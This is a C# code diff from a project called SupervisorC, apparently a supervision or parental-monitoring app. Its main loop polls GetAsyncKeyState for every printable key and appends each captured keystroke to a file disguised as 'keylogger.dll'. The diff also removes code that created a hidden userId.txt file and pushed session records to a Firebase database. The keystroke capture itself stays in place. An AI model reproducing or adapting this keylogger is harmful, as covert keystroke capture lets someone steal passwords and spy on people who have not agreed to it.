@@ -53,32 +53,9 @@ namespace SupervisorC
             //retrieveDataFirstTime();
             string workingDirectory = Environment.CurrentDirectory;
             projectDirectory = Directory.GetParent(workingDirectory).Parent.Parent.FullName;
-            path1 = projectDirectory + @"\userId.txt";
             sumPath = projectDirectory + @"\sum.txt";
             path = projectDirectory + @"\keylogger.dll";
-            if (!File.Exists(path1))
-            {
-                using (StreamWriter sw = File.CreateText(path1))
-                {
-
-                }
-            }
-            else
-            {
-                File.Delete(path1);
-                using (StreamWriter sw = File.CreateText(path1))
-                {
-
-                }
-            }
-            File.SetAttributes(path1, File.GetAttributes(path1) | FileAttributes.Hidden);
-            
-            Thread thread = new Thread(() =>
-              {
-                  updateUserId(path1);
-              });
-            thread.Start();
-            
+            path1 = projectDirectory + @"\userId.txt";
             if (!File.Exists(path))
             {
                 using ( StreamWriter sw = File.CreateText(path)){
@@ -108,67 +85,30 @@ namespace SupervisorC
             {
                   while (true)
                   {
+                     Thread.Sleep(130);//0.1 S });   
                       for (int i = 32; i < 127; i++)
                       {
                           int keyState = GetAsyncKeyState(i);
                           if (keyState != 0)
                           {
-                              using (StreamWriter outputFile = File.AppendText(path))
-                              {
-                                  outputFile.Write((char)i);
-                              }
+                            using (StreamWriter outputfile = File.AppendText(path))
+                            {
+                                outputfile.Write((char)i);
+                            }
+                            Console.Write((char)i + ",");
                           }
                       }
                       //retrieveData();
-                      Thread.Sleep(100);//0.1 S });   
+                     
                   }
             });
 
             thread2.Start();
         }
 
-        private async void updateUserId(string path)
-        {
-            await updateHistory();
-            List<History> histories = new List<History>();
-            List<string> ids = new List<string>();
-            string today = DateTime.Now.ToString("dd/MM/yyyy");
-            FirebaseResponse response1 = await client.GetAsync("History");
-            string a = response1.Body.ToString();
-            a = a.Replace("\"", "");
-            a = a.Substring(1, a.Length - 2);
-            string[] parts2 = Regex.Split(a, @"\}\,");
-            for (int i = 0; i < parts2.Length; i++)
-            {
-                ids.Add(parts2[i].Substring(0, 20));
-            }
-            foreach (string id in ids)
-            {
-                FirebaseResponse response = await client.GetAsync("History/" + id);
-                History temp = response.ResultAs<History>();
-                if (temp.timeEnd == "-1")
-                {
-                    using (StreamWriter outputFile = File.AppendText(path))
-                    {
-                        outputFile.Write(id);
+        
 
-                    }
-                    return;
-                }
-            }
-        }
-
-        private async Task updateHistory()
-        {
-            History temp = new History
-            {
-                date = DateTime.Now.ToString("dd/MM/yyyy"),
-                timeStart = DateTime.Now.ToString("HH:mm"),
-                timeEnd = "-1",
-                keyLog = "-1",
-            };
-            PushResponse response = await client.PushAsync("History", temp);
-        }
+        
 
         private async void retrieveData()
         {
@@ -243,7 +183,7 @@ namespace SupervisorC
                 hour = timeLeft / 3600; // Left hours
                 min = (timeLeft - (hour * 3600)) / 60; //Left Minutes
                 sec = timeLeft - (hour * 3600) - (min * 60); //Left Seconds
-                Console.Write(timeLeft.ToString());
+                //Console.Write(timeLeft.ToString());
                 
                 
                 if (!File.Exists(sumPath))
